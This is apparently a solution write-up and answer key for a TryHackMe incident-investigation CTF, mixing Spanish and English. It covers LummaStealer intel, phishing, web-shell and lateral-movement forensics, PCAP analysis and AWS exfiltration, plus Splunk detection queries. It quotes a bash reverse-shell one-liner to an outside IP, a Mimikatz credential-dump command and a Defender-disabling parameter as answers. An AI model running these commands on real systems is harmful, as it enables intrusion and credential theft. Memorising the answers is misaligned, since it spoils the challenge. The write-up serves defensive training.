# First Shift CTF

![First Shift CTF Banner](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1765566600342)

| **Dificultad** | MEDIUM | **Tipo** | CTF | **Slug** | `first-shift-ctf` |
| **Link** | [TryHackMe](https://tryhackme.com/room/first-shift-ctf) | **Sección** | 02 Level Medium | **Fuente** | Soluciones de la room (Threat Intelligence, Phishing, EDR, Lateral Movement) |
| **Componentes** | Threat Intelligence / Malware Profiling / Phishing / EDR / Web Exploitation / Lateral Movement / PCAP / AWS Exfiltration | **Impacto** | Simula una investigación de incidente de seguridad completa de extremo a extremo |

---

**Contexto:** Este challenge simula una investigación de incidentes de seguridad real, cubriendo Threat Intelligence, Phishing, análisis EDR y Lateral Movement. This challenge simulates a real-world security incident investigation, covering Threat Intelligence, Phishing, EDR analysis, and Lateral Movement.

## Solucionario

### Task 1: Meet ProbablyFine

**Explicación:** Initial check-in to the event. Se obtiene la flag de check-in del evento.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Let's go! Your flag is: | `THM{first_shift_check_in!}` |

### Task 2: Probably Just Fine

**Explicación:** Focus en Threat Intelligence & Malware Profiling (LummaStealer). Se investiga la IP, el servicio ofrecido, el nombre de archivo relacionado con el hash, la firma de amenaza de Microsoft, los dominios vinculados a la misma campaña, la condición de la regla YARA, el título del reporte de TI, la colaboración del autor del malware y un infostealer Android usado por afiliados mexicanos.

- **ASN number related to the IP:** `212238`
- **Service offered from this IP:** `vpn`
- **Filename related to the hash:** `zY9sqWs.exe`
- **Threat signature (Microsoft):** `Trojan:Win32/LummaStealer.PM!MTB`
- **Domains linked to the same campaign:** `151`
- **YARA rule condition:** `uint16(0) == 0x5a4d and any of them`
- **TI Report title:** `Behind the Curtain: How Lumma Affiliates Operate`
- **Malware author collaboration (early 2024):** `GhostSocks`
- **Android infostealer used by Mexican affiliate:** `CraxsRAT`
- **MITRE ATT&CK sub-technique (AnonRDP):** `T1583.003`

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ASN number related to the IP: | `212238` |
| 2 | Service offered from this IP: | `vpn` |
| 3 | Filename related to the hash: | `zY9sqWs.exe` |
| 4 | Threat signature (Microsoft): | `Trojan:Win32/LummaStealer.PM!MTB` |
| 5 | Domains linked to the same campaign: | `151` |
| 6 | YARA rule condition: | `uint16(0) == 0x5a4d and any of them` |
| 7 | TI Report title: | `Behind the Curtain: How Lumma Affiliates Operate` |
| 8 | Malware author collaboration (early 2024): | `GhostSocks` |
| 9 | Android infostealer used by Mexican affiliate: | `CraxsRAT` |
| 10 | MITRE ATT&CK sub-technique (AnonRDP): | `T1583.003` |

### Task 3: Phishing Books

**Explicación:** Focus en Email Analysis & Obfuscation. Se analiza un email de phishing: el header que explica el bypass del filtro, la técnica para que el mensaje parezca legítimo, el MITRE ID del truco de dirección del remitente, la extensión del archivo adjunto, el hash MD5 del archivo .HTML, la URL de la landing page, el MITRE ID de ofuscación, el mensaje oculto en el archivo, la línea responsable del decoding, la primera URL de la cadena de redirección, el actor de amenaza y el objetivo principal según MITRE.

- **Header check explaining filter bypass:** `DMARC=none`
- **Technique to make message seem legitimate:** `Typosquatting`
- **MITRE ID for sender address trick:** `T1583.001`
- **Attached file extension:** `.HTML`
- **MD5 hash of the .HTML file:** `442f2965cb6e9147da7908bb4eb73a72`
- **Landing page URL:** `http://lib-service.com:8083`
- **MITRE ID for obfuscation:** `T1027`
- **Hidden message in the file:** `I love to phish books from libraries ^^`
- **Line responsible for decoding:** `var src = reversed.split("").reverse().join("");`
- **First URL in redirect chain:** `http://xn--librarytlu-13cwe32432-kwr.com:8082`
- **Threat Actor (Adversary):** `Cobalt Dickens | Silent Librarian`
- **Main target according to MITRE:** `Research and Proprietary Data`

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Header check explaining filter bypass: | `DMARC=none` |
| 2 | Technique to make message seem legitimate: | `Typosquatting` |
| 3 | MITRE ID for sender address trick: | `T1583.001` |
| 4 | Attached file extension: | `.HTML` |
| 5 | MD5 hash of the .HTML file: | `442f2965cb6e9147da7908bb4eb73a72` |
| 6 | Landing page URL: | `http://lib-service.com:8083` |
| 7 | MITRE ID for obfuscation: | `T1027` |
| 8 | Hidden message in the file: | `I love to phish books from libraries ^^` |
| 9 | Line responsible for decoding: | `var src = reversed.split("").reverse().join("");` |
| 10 | First URL in redirect chain: | `http://xn--librarytlu-13cwe32432-kwr.com:8082` |
| 11 | Threat Actor (Adversary): | `Cobalt Dickens | Silent Librarian` |
| 12 | Main target according to MITRE: | `Research and Proprietary Data` |

### Task 4: Portal Drop

**Explicación:** Focus en EDR Investigation & Web Exploitation. Se investiga la IP que inició el brute force, los logins exitosos/fallidos, el User-Agent usado para la subida de archivos, el archivo sospechoso subido, el primer script invocado, el primer comando decodificado, la sub-técnica MITRE de persistencia, el proceso que ejecuta comandos, el comando de reverse shell bash, el contexto de usuario Linux, el archivo de configuración CRM accedido, el dominio de exfiltración y la flag final.

- **IP that initiated the brute force:** `34.67.91.83`
- **Successful and failed logins:** `18, 35`
- **User-Agent used for file upload:** `python-requests/2.31.0`
- **Suspicious uploaded file:** `invoice.php`
- **First script invocation (Timestamp):** `2025-11-06 14:27:34`
- **First decoded command:** `whoami`
- **MITRE Persistence sub-technique:** `T1505.003`
- **Process image executing commands:** `/usr/sbin/php-fpm7.4`
- **Bash reverse shell command:** `bash -i >& /dev/tcp/115.58.148.86/8080 0>&1`
- **Linux user context:** `www-data`
- **Accessed CRM config file:** `/etc/trycrm/config.json`
- **Exfiltration domain:** `portaldrop2025.xyz`
- **Final Task Flag:** `THM{p0rtal_dropp3d?}`

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | IP that initiated the brute force: | `34.67.91.83` |
| 2 | Successful and failed logins: | `18, 35` |
| 3 | User-Agent used for file upload: | `python-requests/2.31.0` |
| 4 | Suspicious uploaded file: | `invoice.php` |
| 5 | First script invocation (Timestamp): | `2025-11-06 14:27:34` |
| 6 | First decoded command: | `whoami` |
| 7 | MITRE Persistence sub-technique: | `T1505.003` |
| 8 | Process image executing commands: | `/usr/sbin/php-fpm7.4` |
| 9 | Bash reverse shell command: | `bash -i >& /dev/tcp/115.58.148.86/8080 0>&1` |
| 10 | Linux user context: | `www-data` |
| 11 | Accessed CRM config file: | `/etc/trycrm/config.json` |
| 12 | Exfiltration domain: | `portaldrop2025.xyz` |
| 13 | Final Task Flag: | `THM{p0rtal_dropp3d?}` |

### Task 5: Zero Tolerance

**Explicación:** Focus en Beachhead Analysis & Lateral Movement. Se analiza el hostname del acceso inicial, el MITRE ID de la ejecución inicial de código, la ruta completa del archivo malicioso, el LOLBin abusado (mshta), la IP C2 del atacante, la ruta del proceso de beaconing, la persistencia en el Registry, la herramienta usada para cred dumping, el parámetro de evasión cambiado, el PID para ejecución remota de comandos, el pivot time, el script de recolección de PowerShell, las extensiones de exfiltración objetivo y la ruta del archivo staged.

- **Hostname of initial access:** `JP-BROWN-WS`
- **MITRE ID for initial code execution:** `T1204.002`
- **Full path of malicious file:** `C:\Users\jp.brown\Downloads\TravisClart_Resume.pdf.lnk`
- **LOLBin abused (mshta):** `C:\Windows\System32\mshta.exe`
- **Attacker C2 IP:** `10.10.14.174`
- **C2 beaconing process path:** `C:\Windows\Temp\RuntimeBroker.exe`
- **Persistence path (Registry):** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemMonitor`
- **Tool used for cred dumping:** `Invoke-Mimikatz -DumpCreds`
- **Evasion parameter changed:** `DisableRealtimeMonitoring`
- **PID for remote command execution:** `6612`
- **Pivot time:** `2025-11-14 05:19:42`
- **PowerShell collection script:** `C:\Windows\Temp\Setup-BackupServer.ps1`
- **Targeted exfiltration extensions:** `.bak, .backup, .sql, .mdb`
- **Staged file path:** `C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat`

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Hostname of initial access: | `JP-BROWN-WS` |
| 2 | MITRE ID for initial code execution: | `T1204.002` |
| 3 | Full path of malicious file: | `C:\Users\jp.brown\Downloads\TravisClart_Resume.pdf.lnk` |
| 4 | LOLBin abused (mshta): | `C:\Windows\System32\mshta.exe` |
| 5 | Attacker C2 IP: | `10.10.14.174` |
| 6 | C2 beaconing process path: | `C:\Windows\Temp\RuntimeBroker.exe` |
| 7 | Persistence path (Registry): | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemMonitor` |
| 8 | Tool used for cred dumping: | `Invoke-Mimikatz -DumpCreds` |
| 9 | Evasion parameter changed: | `DisableRealtimeMonitoring` |
| 10 | PID for remote command execution: | `6612` |
| 11 | Pivot time: | `2025-11-14 05:19:42` |
| 12 | PowerShell collection script: | `C:\Windows\Temp\Setup-BackupServer.ps1` |
| 13 | Targeted exfiltration extensions: | `.bak, .backup, .sql, .mdb` |
| 14 | Staged file path: | `C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat` |

### Task 6: The Crown Jewel

**Explicación:** Focus en Network Forensics & PCAP Analysis. Se analiza el PCAP para determinar la IP interna originaria de la conexión sospechosa, la conexión saliente detectada como canal C2, la MAC que se hace pasar por el gateway, el User-Agent no estándar que golpea la instancia de Jira, el número de ataques de ARP spoofing, el payload con credenciales en claro en el POST, el dominio propiedad del atacante usado para exfiltración y el protocolo usado para la exfiltración.

- **From which internal IP did the suspicious connection originate?** `10.10.10.100`
- **What outbound connection was detected as a C2 channel?** (Ex: 1.2.3.4:9996) `1.1.1.1:8080`
- **Which MAC address is impersonating the gateway 10.10.10.1?** `00:0c:29:11:22:33`
- **What is the non-standard User-Agent hitting the Jira instance?** `CVE-202X-EXPLOIT`
- **How many ARP spoofing attacks were observed in the PCAP?** `90`
- **What's the payload containing the plaintext creds found in the POST request?** `username=dev_user&password=SecretPassword!`
- **What domain, owned by the attacker, was used for data exfiltration?** `exfil-domain.xyz`
- **After examining the logs, which protocol was used for data exfiltration?** `DNS`

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | From which internal IP did the suspicious connection originate? | `10.10.10.100` |
| 2 | What outbound connection was detected as a C2 channel? (Ex: 1.2.3.4:9996) | `1.1.1.1:8080` |
| 3 | Which MAC address is impersonating the gateway 10.10.10.1? | `00:0c:29:11:22:33` |
| 4 | What is the non-standard User-Agent hitting the Jira instance? | `CVE-202X-EXPLOIT` |
| 5 | How many ARP spoofing attacks were observed in the PCAP? | `90` |
| 6 | What's the payload containing the plaintext creds found in the POST request? | `username=dev_user&password=SecretPassword!` |
| 7 | What domain, owned by the attacker, was used for data exfiltration? | `exfil-domain.xyz` |
| 8 | After examining the logs, which protocol was used for data exfiltration? | `DNS` |

### Task 7: Promotion Night

**Explicación:** Focus en Final Compromise & AWS Exfiltration. Se analiza la ruta del share de red donde se colocó el ransomware, el valor de persistencia del ransomware, la extensión más probable de los archivos encriptados, el MITRE ID de despliegue, los puertos escaneados de SRV-ITFS, la ruta al malware de discovery, el artefacto creado para persistencia, el hash MD5 del shellcode inicial, el framework C2 usado, el hostname del login del adversario, la ruta UNC con credenciales AWS, la IP del adversario para acceso AWS, los archivos sensibles exfiltrados de AWS y el archivo subido a S3.

- **Network share path where ransomware was placed:** `\\DC-01\SYSVOL\gaze.exe`
- **Ransomware persistence value:** `BabyLockerKZ`
- **Most likely extension of encrypted files:** `.danger17`
- **MITRE technique ID for deployment:** `T1047`
- **Successfully scanned ports of SRV-ITFS:** `135, 139, 445, 3389, 5985`
- **Full path to Discovery malware:** `C:\Windows\System32\fr-FR\ruche.dll`
- **Artifact created for persistence:** `LanguageSync`
- **MD5 hash of initial shellcode:** `27B0D51406B5360B49D968D69DF0F3E6`
- **C2 framework used:** `Cobalt Strike`
- **Hostname of adversary login:** `DESKTOP-J9PR0CO`
- **UNC path with AWS credentials:** `\\SRV-ITFS\Integrations\cloud-keys.csv`
- **Adversary IP for AWS access:** `152.42.128.207`
- **Sensitive files exfiltrated from AWS:** `beta.tar.gz, latest.tar.gz`
- **File uploaded to S3:** `YOU-HAVE-BEEN-PWNED.txt`

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Network share path where ransomware was placed: | `\\DC-01\SYSVOL\gaze.exe` |
| 2 | Ransomware persistence value: | `BabyLockerKZ` |
| 3 | Most likely extension of encrypted files: | `.danger17` |
| 4 | MITRE technique ID for deployment: | `T1047` |
| 5 | Successfully scanned ports of SRV-ITFS: | `135, 139, 445, 3389, 5985` |
| 6 | Full path to Discovery malware: | `C:\Windows\System32\fr-FR\ruche.dll` |
| 7 | Artifact created for persistence: | `LanguageSync` |
| 8 | MD5 hash of initial shellcode: | `27B0D51406B5360B49D968D69DF0F3E6` |
| 9 | C2 framework used: | `Cobalt Strike` |
| 10 | Hostname of adversary login: | `DESKTOP-J9PR0CO` |
| 11 | UNC path with AWS credentials: | `\\SRV-ITFS\Integrations\cloud-keys.csv` |
| 12 | Adversary IP for AWS access: | `152.42.128.207` |
| 13 | Sensitive files exfiltrated from AWS: | `beta.tar.gz, latest.tar.gz` |
| 14 | File uploaded to S3: | `YOU-HAVE-BEEN-PWNED.txt` |

### Reference — VirusTotal y Queries Splunk

**VirusTotal (ransomware):**
```
https://www.virustotal.com/gui/file/6d000a159fe10af1b29ddf4e4015931a9e9d0a020aeef0c602d8c5419b5966e6
```

**Splunk queries usadas en la investigación:**
```
index=scenario host=SRV-JMP
| search copy OR xcopy OR robocopy OR powershell
| table _time CommandLine
| sort _time
 
index=scenario host=SRV-JMP
| search encrypt OR ransomware OR vssadmin OR shadow
| table _time EventCode Process_Name CommandLine Object_Name User
| sort _time
 
index=scenario (EventCode=12 OR EventCode=13 OR EventCode=14)
("CurrentVersion\\Run" OR "CurrentVersion\\RunOnce")
| table _time host User EventCode TargetObject Details Image
| sort _time
 
index=scenario host=SRV-JMP
(CommandLine="*net view*" OR CommandLine="*wmic*" OR CommandLine="*ipconfig*")
| table _time host Image ParentImage CommandLine
| sort _time
 
index=scenario host=SRV-JMP (CommandLine="*schtasks*" OR CommandLine="*ruche.dll*" OR CommandLine="*StartW*")
| table _time host Image ParentImage CommandLine User
| sort _time
 
index=scenario Image="*powershell.exe*" | where isnotnull(CommandLine) AND CommandLine!=""  | search host="SRV-JMP"
 
index=scenario host=SRV-JMP source="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
| search "Creating Scriptblock text"
| rex field=Message "Creating Scriptblock text \((?<part>\d+) of (?<total>\d+)\):\s*(?<chunk>.*)"
| eval part=tonumber(part), total=tonumber(total)
| where total=24
| sort 0 ScriptBlockId part
| stats list(chunk) as chunks by ScriptBlockId total
| eval full_script=mvjoin(chunks,"")
| table ScriptBlockId total full_script
 
 
index=scenario source="WinEventLog:Security" EventCode=4624
| where Logon_Type IN ("3","10")
| stats count values(IpAddress) values(Ip_Address) by host ComputerName AccountName
| sort -count
 
index=scenario Object_Name="*\\Desktop\\Shared*"
| stats count by Object_Name
| sort - count
 
 
index=scenario eventSource=cloudtrail.amazonaws.com OR eventSource=s3.amazonaws.com OR eventSource=ec2.amazonaws.com OR eventSource=sts.amazonaws.com
| stats count by sourceIPAddress
| sort - count
 
index=scenario eventSource=s3.amazonaws.com eventName=GetObject sourceIPAddress=152.42.128.207
| stats count by requestParameters.key
| sort - count
 
index=scenario eventSource=s3.amazonaws.com eventName=PutObject sourceIPAddress=152.42.128.207
| stats count by requestParameters.key
```

---

**Metodología:**
1. **Meet ProbablyFine:** Realizar el check-in del evento y capturar la primera flag.
2. **Probably Just Fine:** Investigar el LummaStealer con Threat Intelligence: ASN, servicio, hash, firma Microsoft, dominios, regla YARA, reporte TI, colaboradores y MITRE.
3. **Phishing Books:** Analizar el email de phishing: DMARC, typosquatting, archivo HTML, MD5, landing page, ofuscación, decoding, redirecciones y actor de amenaza.
4. **Portal Drop:** Investigar el acceso e intrusión web (brute force, upload de webshell, reverse shell) con data de EDR.
5. **Zero Tolerance:** Analizar el beachhead y movement lateral (LOLBin, C2, persistencia, credential dumping, staging).
6. **The Crown Jewel:** Analizar el PCAP (origen, C2, ARP spoofing, creds en POST, exfiltración vía DNS).
7. **Promotion Night:** Reconstruir el compromiso final (ransomware, Cobalt Strike, credenciales AWS, exfiltración a S3).

**Learning chain:** Check-in → TI LummaStealer (ASN/hash/YARA/MITRE) → Phishing (DMARC=none, typosquatting, HTML decode, Silent Librarian) → Portal Drop (brute force → invoice.php → reverse shell → www-data → exfil portaldrop2025.xyz) → Zero Tolerance (LNK mshta → C2 → Mimikatz → staging) → Crown Jewel (PCAP: C2 1.1.1.1:8080, ARP spoof, DNS exfil) → Promotion Night (ransomware gaze.exe → Cobalt Strike → AWS keys → S3 PWNED)

**Lección:** *Una investigación completa de incidente correlaciona TI, análisis de phishing, telemetría EDR, forense de red (PCAP) y nube (AWS), reconstruyendo cada etapa de la cadena de ataque hasta la exfiltración.*

**MITRE ATT&CK:** T1566.001 (Phishing: Spearphishing Attachment), T1059.007 (JavaScript), T1505.003 (Web Shell), T1204.002 (User Execution: Malicious File), T1059.001 (PowerShell), T1003.001 (Credential Dumping: LSASS Memory), T1547.001 (Registry Run Keys), T1048.003 (Exfiltration Over Alternative Protocol), T1041 (Exfiltration Over C2 Channel), T1047 (Windows Management Instrumentation), T1583.003 (Acquire Infrastructure: Virtual Private Server)

**CWE:** CWE-79 (XSS), CWE-200 (Information Exposure)

**Fuente:** [TryHackMe - First Shift CTF](https://tryhackme.com/room/first-shift-ctf)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
